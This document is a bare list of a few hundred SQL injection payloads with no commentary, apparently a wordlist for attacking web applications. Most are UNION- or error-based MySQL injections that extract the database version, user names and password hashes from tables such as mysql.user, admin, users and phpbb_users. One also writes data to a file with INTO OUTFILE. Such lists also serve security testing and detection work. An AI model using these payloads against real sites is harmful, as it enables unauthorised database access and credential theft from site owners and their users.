"-99 union select 1,2,3,concat(user(),'O_o','preved'),5,6,7,8,9,10/*"
"-99 union select 1,2,3,concat_ws(0x3a3a,t_id,t_nombre,t_dependencia,t_direccion,t_telcasa,t_movil,t_correo,n_activo) from asociado limit 2,1 --"
"99 union select 1,2,3,concat_ws(0x3a,user(),database(),version(),login,password),5,6 from sadmin--"
"99 union select 1,2,3,log,5,pas,7,8 from user/*"
"-99 union select 1,2,3,password,username,6,7,8,9,10,11,12,13,14,15,16,17 from access"
"-99 union select 1,2,3,'preved:D',5,6,7/*"
"-99 union select 1,2,3,user,password,6 from mysql.user/*"
"-99 union select 1,2,concat(0x3a,version(),0x3a,user(),0x3a,database())--"
"-99 union select 1,2,concat(admin_name,0x3a,admin_pass),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from admin/*"
"-99' union select 1,2,concat(convert(user using cp1251),0x3a,convert(password using cp1251)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 from mysql.user limit 0,1/*"
"99' union select 1,2,concat(fname,char(58),password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from personnel limit 2,1/*"
"-99' union select 1,2,concat(login,0x3a,password),4 from users/*"
"-99 union select 1,2,concat(username,0x3a,password),4 from users limit 0,1/*"
"-99 union select 1,2,concat(username,0x3a,user_password),4,5,6,7,8 from phpbb_users limit 1,1/*"
"-99 union select 1,2,concat_ws(0x3a,version(),user(),database()),4--"
"-99 union select 1,2,concat_ws(0x3a,version(),user(),database))),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39/*"
"-99 UNION SELECT 1,2,CONCAT_WS(CHAR(59),user_id,user_name,user_real_name,user_password,user_newpassword,user_email),4,5,6 from user/*"
"-99 UNION SELECT 1,2,login,4,5,6,7,8,9,10,password,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 FROM admin--"
"-99 union select 1,2,login,4,5,6,7,8 ,9,password,11 from user limit 1,1/*"
"-99"" union select 1,2,user,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,password,39,40,41,42,43,44,45,46,47 from mysql.user/*"
"-99 union select 1,2,user,4,5,6,7,8,9 from mysql.user--"
"-99 union select 1,2,version(),4,5,6,7,8,9--"
"-99 union select 1,2,version(),user(),5,6,7/*"
"-99' union select 1,aes_decrypt(aes_encrypt(database(),0x71),0x71),3,4,5,6,7,8,9,10,11,12,13,14/*"
"99 union select 1,COLUMN_NAME,3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x6f617a69735f7573657273 LIMIT 1,3 --"
"-99 union select 1,concat(0x3a,version(),0x3a,user(),0x3a,database(),0x3a)--"
"-99 union select 1,concat(0x3a,version(),0x3a,user(),0x3a,database(),0x3a),3--"
"-99 union select 1,concat(convert(login using cp1251),0x3a,convert(password using cp1251)),3,4,5,6,7,8 from clients/*"
"-99 union select 1,concat(login,0x3a3a,pwd),3 from users--"
"-99 union select 1,concat(login,0x3a,pwd),3 from users limit 0,1/*"
"-99 union select 1,concat(login,char(58),passwd,char(58),email) from ds_users/*"
"99 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8 limit 1,1"
"99' union select 1,concat_ws(':',id,login,password,access),3,4,5,6,7,8,9,10,11 from users--"
"-99 union select 1,convert(user using cp1251),convert(password using cp1251),4,5,6,7,8,9,10,11,12,13 from mysql.user/*"
"-99 union select 1,convert(version() using latin1),3,4,5,6,7,8,9,0,1,2,3/*"
"-99 union select 1,fullname,pwd,4,5,6,7,8,9,10,11,12,13 from admin/*"
"-99 union select 1,id,3,4,5,6,7,8,9,0,1,2,3 from users/*"
"-99 union select 1,table_name,3,4,5,6,7,8,9 from information_schema.tables--"
"-99' union select 1,table_name,3,4,convert('asd' using utf8),6,7,8,9 from INFORMATION_SCHEMA.TABLES/*"
"-99 union select 1,user(),3,4,5,6,7,8/*"
"99' union select 1,user(),3,4,5,6,version(),8,9/*"
"-99 union select 1,username,3,4,5,6,7,8,9 from phpbb_users/*"
"-99 union select 1,user,password,4 from mysql.user/*"
"99  union select 1,version(),3,4,5,6,7,8,9,10/*"
"-99 union select 1,version(),3,4,5,6,7,8,9,10,11,12,13,14/*"
"99 union select  5,16,17,18,user(1)/*"
"-99 union select AES_DECRYPT(aes_encrypt(user(),0x71),0x71),2,3,4,5,6,7,8,9,10,11,12,13/*"
"-99 union select concat(login,0x3a,pwd) from user limit 0,1/*"
"-99 union select concat(user,0x3a,password),2,3,4,5,6,7,8 from mysql.user limit 45/*"
"-99 UNION SELECT concat_Ws(0x0b,user(),database(),version()) --"
"-99 union select convert(concat(user,0x3a,password)using cp1251),2 from mysql.user/*"
"-99 union select convert(concat(user,0x3a,password) using cp1251) from mysql.user/*"
"-99 UNION SELECT name,2 from master..sysdatabases--"
"-99 union select table_name,2,3,4,5 from INFORMATION_SCHEMA.TABLES limit 16,1/*"
"-99 union select user(),2,3,4,5,6,7,8,9,10,11/*"
-99 union select version()
"99 union select version(),2,3,4,5,6,7,8--"
"9 and 0 UnIon selECt version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37 --"
"9 and 1=0 Union Select 1,0x4861636B656420627920494E432E--"
"9 and 1=0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from customer"
"9 aNd 1=0 UNION SELECT 1,2,3,4,version(),6 --"
"9' aNd 1=0 UNION SELECT 1,2,3,4,version(),6,7,8,9,10,11,12,13,14,15,16,17,18 --"
"9 and 1=0 union select 1,2,3,concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),5,6,7,8,9--"
"9 and 1=0 union select 1,concat_ws(0x3a,name,password,fullname,mail),3,4,5,6 from users limit 0,1 --"
"9 and 1=0 union select 1,concat_ws(0x3a,ner_name,ner_pass) from ner_admin --"
"9 and 1=0 union select 1,concat_ws(0x3a,user(),version()),3,4,5,6--"
"9 and 1=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --"
"9 and 1=0 union select concat(version(),0x3a,user(),0x3a,database()),2,3,4,5,6,7,8,9,10--"
9 and 1=0 union select version() --
"-9 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,concat_ws(0x3a,@@version,user(),database(),@@version_compile_os),12 --"
"9 and 1=2 union select 1,2,3,4,5,6,7,group_concat(column_name),9,10,11,12 from information_schema.columns where table_name=0x7573657273 --"
"9 and 1=2 union select 1,2,table_name,4 from information_schema.tables limit 25,1/*"
"9 and mid(version(),1,1)=3"
"9' and (select 1 from (select count(0),concat((select version() from debates limit 1),floor(rand(0)*2)) from debates group by 2 limit 1)a) and '123'='123"
"9 and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2)) from information_schema.tables group by 2)x)--"
"9) and substring(version(),1,1)=5/*"
9DC3ABAF4E4C49DF99A6913572D9A323' OR 1=(select @@version)--
"9 or 1 group by concat(concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os,0x3a3a),rand(0)|0) having min(0)--"
"9 or 1 group by concat(left(concat_ws(0x3a,user(),database(),version()),64),rand(0)|0) having avg(0)"
9 or 1=(select top 1 cast(id as nvarchar) ':' cast(firstName as nvarchar) ':' cast(password as nvarchar) from tblLogin)--
"9 union all select 1,concat_ws(version(),user(),database()),3,4,5,6,7,8--"
"-9 UnIoN all select concat_ws(0x3a,@@version,user(),database()),2"
"-9' union select 1,2,3,4,5,6 --"
"-9 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,concat_ws(0x3a,login,pass),34,35 from u57027_2.osnova/*"
"9 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,@@version,15,16,17,18 --"
"-9 union select 1,2,3,4,5,6,7,8,9,10,column_name,12,13,14,15 from information_schema.columns where table_name=0x6d6f64466565646261636b55736572--"
"-9 union select 1,2,3,4,5,6,7,8,concat_ws(0x3a,database(),version(),user()),10--"
"-9 union select 1,2,3,4,5,6,7,8 union select 1,2,3,4,5,6,7,8 --"
"-9 union select 1,2,3,4,5,6,7,concat_ws(0x3a3a,UserPass,UserName,UserEmail),9 from CMSUsers limit 0,1 --"
"-9 union select 1,2,3,4,5,6,7,concat_ws(0x3a,login,password),9 from users/*"
"-9 union select 1,2,3,4,5,6,7,concat_ws(0x3a,version(),user(),database()),9,10,11/*"
"-9 union select 1,2,3,4,5,6,concat(user_name,char(58),password),8 from users/*"
"9 union select 1,2,3,4,5,6,concat_ws(0x3a,user(),database(),version()),8,9,10,11,12,13,14,15,16/*"
"-9 union select 1,2,3,4,5,6,concat_ws(0x3a,user(),version(),database()),8,9/*"
"9 union select 1,2,3,4,5,concat(0x2,version(),user(),database()),7,8,9,10,11"
"9 union select 1,2,3,4,5,concat_ws(0x3a3a,usuario,clave,Nombre,email),7,8,9 from usuarios limit 1,1 --"
"-9 UNION SeLeCt 1,2,3,4,5,concat_ws(0x3a3a,version(),user()),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--"
"-9 union select 1,2,3,4,5,concat_ws(0x3a,user(),database(),version())--"
"-9 union select 1,2,3,4,concat(login,0x3a,pwd),6,7,8,9 from maybach_users/*"
"-9' union select 1,2,3,4,concat(user(),0x3a,version(),0x3a,database()),6,7,8/*"
"-9 union select 1,2,3,4,concat_ws(0x2a2a2a,user,password),6,concat_ws(0x2a2a2a,version(),user(),database()),8 from mysql.user limit 1,1--"
"-9 union select 1,2,3,4,concat_ws(0x3a,user(),version(),@@version_compile_os)--"
"9 union select 1,2,3,4,concat_ws(0x3a,version(),database(),user()),6,7,8 limit 1,1/*"
"9 UNION SELECT 1,2,3,4,concat_ws(0x3,password),6,7,8,9,10,11 from grandliteadmin--"
"-9 union select 1,2,3,4,convert(concat(username,char(58),pword) using latin1),6,7,8,9 from users"
"-9 union select 1,2,3,4,group_concat(0x0b,column_name),6 from information_schema.columns where table_name=0x70687062625f666f72756d7573657273--"
"-9 union select 1,2,3,4,id,6,7,8,9,10,11,12,13,14,15,16,17,18 from user --"
"-9 union select 1,2,3,4,user_name,6,7,8,9,user_password,11,12,13 from users --"
"-9 union select 1,2,3,concat(0x3,hash),5 from adminsessions--"
"-9 union select 1,2,3,concat(char(58,58,58),concat_ws(char(58),user_login,user_pass,user_email),char(58,58,58)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from evo_users/*"
"-9 union select 1,2,3,concat(database(),version(),user()),5,6,7,8,9,10--"
"9 union select 1,2,3,concat(table_name,0x3a,column_name),5,6,7 from information_schema.columns/*"
"-9 union select 1,2,3,concat(username,char(58),password),5,6 from admin --"
"-9 union select 1,2,3,concat_ws(0x3a,ID,UserName,UserPass,UserMail),5,6,7 from users/*"
"-9 union select 1,2,3,concat_ws(0x3a,UserName,LoginName,PassWord,email,phoneNo) from tbl_adminusers--"
"-9 union select 1,2,3,concat_ws(0x3a,version(),user(),database()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/*"
"-9 union select 1,2,3,convert(1 using latin1),5,6,7,8,9/*"
"-9 union select 1,2,3,convert(version() using latin1),5,6,7,8,9"
"-9 union select 1,2,3,group_concat(0x0b,Username,0x3a,Password),5,6,7,8 from dulam_admin--"
"-9 union select 1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables limit 16,1/*"
"-9 union select 1,2,3,version(),5 --"
"9' union select 1,2,3,version(),5,6,7,8,9,10,11,12,13,14,15,16#"
"-9 union select 1,2,aes_decrypt(aes_encrypt(concat_ws(0x3a,user(),version(),database()),0x55),0x55),4,5,6,7,8,9,0,1,2,3,4,5/*"
"-9 union select 1,2,cast(concat(user_name,0x3a,user_password) as binary),4,5,6,7,8 from 4images_users limit 2,1/*"
"-9 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='admins' limit 1,1/*"
"-9 union select 1,2,concat(AdminName,0x20,AdminPwd),4,5,6,7,8,9 from Admin--"
"-9 union select 1,2,concat(user(),0x3a,version(),0x3a,database())--"
"-9 union select 1,2,concat(user(),0x3a,version()),4,5,6,7/*"
"-9 union select 1,2,concat(username,0x3a,password,0x3a,email),4,5,6,7 from user"
"-9 union select 1,2,concat_ws(0x0b,version(),user(),database(),@@version_compile_os),4,5,6--"
"-9 union select 1,2,concat_Ws(0x3a3a,idadmin,usuario,password,email,activo,nivel),4,5,6 from admin --"
"-9 union select 1,2,concat_ws(0x3a,login,password),4,5,6,7,8,9,10 from users--"
"9 union select 1,2,concat_ws(0x3a,user(),database(),version()),4,5,6--"
"-9 union select 1,2,concat_ws(0x3a,username,user_password),4,5,6,7 from phpbb_users/*"
"-9 union select 1,2,concat_ws(0x3a,Userusuario,passUsuario),4,5,6 from usuarios_panel --"
"-9 union select 1,2,concat_ws(0x3a,version(),database(),user()),4--"
"9 UNION SELECT 1,2,concat_Ws(0x3a,version(),database(),user(),@@version_compile_os),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46"
"9 union select 1,2,concat_ws(0x3a,version(),user(),database()),4,5,6,7,8,9/*"
"-9 union select 1,2,concat_ws(0x3a,version(),user(),database()),4,5,6,7,8,9,10,11,12,13,14/*"
"-9 union select 1,2,concat_ws(0x3C6272202F3E,DATABASE(),USER(),VERSION()),4,5"
"-9 union select 1,2,concat_ws(char(58),user(),version(),database()),4,5,6,7,8/*"
"-9 UNION SELECT 1,2,convert(concat(username,char(58),password) using latin1),4 FROM arjan.users/*"
"-9 union select 1,2,database(),user(),5,6,version(),8,9--"
"-9 union select 1,2,group_concat(0x0b,admin_login,0x3a,admin_password),4,5,6,7,8,9 from admin--"
"-9 union select 1,2,group_concat(0x3a3a,id_usr,email_usr,0x3a3a,password_usr),4,5 from users_usr --"
"-9 UnIon selECt 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_shema=database()--"
"9 union select 1,2,group_concat(table_name),4 from information_schema.tables--"
"-9 union select 1,2,group_concat(table_name separator 0x3a),4,5,concat_ws(0x3a3a3a,user(),database(),version()),7 from information_schema.tables where table_schema=0x706f727461696c --"
"-9 union select 1,2,unhex(hex(concat_ws(0x3a,version(),user()))),4,5--"
"9 union select 1,concat(user(),0x3a,database(),0x3a,version()),null,4,5,6,7/*"
"-9 union select 1,concat(user,char(58),password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from user --"
"-9 UNION SELECT 1,concat(username,0x3a,user_password,0x3a,user_icq,0x3a,user_email,0x3a,user_aim,0x3a,user_yim,0x3a,user_msnm,0x3a,user_occ),3 FROM phpbb_users/*"
"-9 union select 1,concat(username,char(58),user_icq,char(58),user_password),3,4,5,6,7,8,9 from phpbb_users limit 1,1/*"
"-9 union select 1,concat(version(),0x3a,database(),0x3a,user()),3,4,5--"
"-9 union select 1,concat(version(),0x3a,user(),0x3a,database()),3,4,5,6,7,8"
"-9 union select 1,concat_ws(0x0b,version(),user(),database(),@@version_compile_os)--"
"-9 union select 1,concat_ws(0x3a3a,admin_email_address,admin_password),3,4,5 from admin/*"
"-9 union select 1,concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),group_concat(0x0b,adresse,0x3a3a,mdp),4,5,6,7 from membre--"
"-9 union select 1,concat_ws(0x3a3a,version(),@@version_compile_os,user(),database())"
"-9 union select 1,concat_ws(0x3a,login,password),3,4,5,6,7,8,9,0 from _Users/"
"9 union select 1,concat_ws(0x3a,username,password),3,4,5,6,7 from admin_login limit 2,1/*"
"-9 union select 1,concat_ws(0x3a,user(),version()),3,4--"
"9 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5 --"
"9 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),3,4,5,6,7,8,9"
"-9 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13"
"-9 union select 1,concat_ws(0x3a,version(),database(),useR()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33"
"-9 union select 1,concat_ws(0x40,user(),database(),version()),3,4,5,6,7,8,9,10,11,12 from users/*"
"-9 union select 1,concat_ws(version(),0x3b,user(),0x3b,database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37"
"-9 union select 1,convert(version() using latin1),3,4,5,6,7,8,9 from users"
"-9 union select 1,database(),version(),4,5,6,7,8,9,10,11,user()/*"
"-9 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x636C5F6E657773 /*"
"-9 union select 1,group_concat(username),3,4,5,6 from users --"
"-9 union select 1,null,concat(user_name,char(58),user_password),4,5 FROM photo_users/*"
"-9 union select 1,SQL,3,4,5--"
"-9 union select 1,table_name,table_schema,version(),5,6,7,8,9,0 from information_schema.tables/*"
"-9 union select 1,user(),3,4,5,6,7,8,9 --"
"-9 union select 1,user(),3,4,5,version()/*"
"-9 union select 1,username,password,4,5,6,7,8,9 from db_user/*"
"9 union select 1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46 from user"
"-9 union select 1,version(),3,4,user(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/*"
"-9 union select concat(0x3c623e41646d696e204163636f756e743a3c2f623e3c62723e2061646d696e3a,pass459khyf),2,3,4,concat(0x3c623e7573657228293a646174616261736528293a76657273696f6e28293a3c2f623e203c693e,user(),0x3a,database(),0x3a,version()) from rkh8t5po"
"-9 union select concat(0x3,version())/*"
"-9 union select concat(user(),0x3a,0x3a,database(),0x3a,0x3a,version())/*"
"-9 UNION SELECT concat(username,char(58),passwd) from user limit 141,141 --"
"-9' union select concat(version()),2,3,4,5,6and'1'='1"
"-9 union select concat_ws(0x0b,version(),user(),database(),@@version_compile_os)--"
"9 union select concat_ws(0x3a,database(),user(),version()),2,3--"
"9 union select concat_ws(0x3a,version(),user(),database(),@@version_compile_os)"
-9 union select database()/*
"-9 union select group_concat(0x3a,version(),user(),@@version_compile_os),2,3,4 --"
"-9 union select group_concat(login,0x3a,password),2,3 from user--"
"9 union select null,null,null/*"
"-9' union select null,null,null,null,null,null,null,null,password,user,null,null,null,null,null,null,null,null,null,null,null,null from mysql.user limit 0,1 INTO OUTFILE 'test'/*"
"-9 union select unhex(hex(concat_ws(0x3a,version(),database(),user()))),2,3,4,5,6,7--"
"-9 union select unhex(hex(concat_ws(0x3a,version(),user(),database())))--"
"-9 union select unhex(hex(version())),2/*"
"a138 and substring(version(),1,1)=4"
"a43947323 union select 1,2,version(),4,5,6,7,8,9,10,11,12,13 --"
aaa' or 1=1/*
"aaa' or 1=1 union select 11111 limit 16,1/*"
aaa' union select 1/*
"aaa' union select NULL,NULL,version(),database(),user(),NULL,NULL,NULL,NULL,NULL,1,2,3,4,5,6,7,8,9,20,1 --"
a%25') and 1=@@version--
"aa') union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/*"
"## actu.php?id_actu=-1 union select 1,2,3,4,5,concat_ws(0x3a,version(),database(),user()),7,8,9,10/*"
"(added_on*if(ascii(substring((select version() from information_schema.tables limit 1,1),1,1))=53,1,-1))"
"-adig' union select 1,2,3,4,concat_ws(0x3a,database(),user(),version()),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 --"
"alpine_boots where 1=2 union select version(),2,3,4,5,6,7,8,9,0,1,2,1,4,5,6,7,8,9,0,1,2,3,4,5,6,7--"
"-Alumni_Services' union select 1,concat(name,char(58),pass) from users limit 0,1 /*"
"Âñå ðåãèîíû' union select 1,group_concat(version(),0x3a,user(),0x3a,database()),3,4,5,6,7,8,9,10,11,12--"
"' and 0 union select 1,2,3,username,5,password,7,8,9,10,11 from #__users#"
"and 1=0 union select concat_ws(0x3a,version(),user(),database()),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 --"
"%25' and (1,1)=(select count(*),concat(version(),floor(rand(0)*2))from essentials group by 2) --"
"' and 1=1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4 --"
"' and 1=2/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,concat(username,char(58),password),0,11,12 from jos_users/*"
"and 1=2 union  select 1,concat(username,char(58),pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 from amp_forum_users--"
"' and (select*from(select count(*)from(select 1 union select 2 union select 3)x group by concat(mid((select concat_ws(0x3a,version(),database(),user()) from INFORMATION_SCHEMA.TABLES limit 0,1),1,64),floor(rand(0)*2)))z)--"
